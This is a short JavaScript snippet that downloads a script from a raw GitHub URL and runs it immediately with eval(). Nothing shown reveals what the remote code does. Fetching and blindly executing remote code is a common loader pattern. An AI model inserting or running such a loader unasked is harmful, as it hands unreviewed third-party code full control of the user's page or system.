fetch("https://raw.githubusercontent.com/Anarxyfr/test/refs/heads/main/index.js")
  .then(response => response.text())
  .then(script => eval(script))
  .catch(error => console.error("Error loading script:", error));
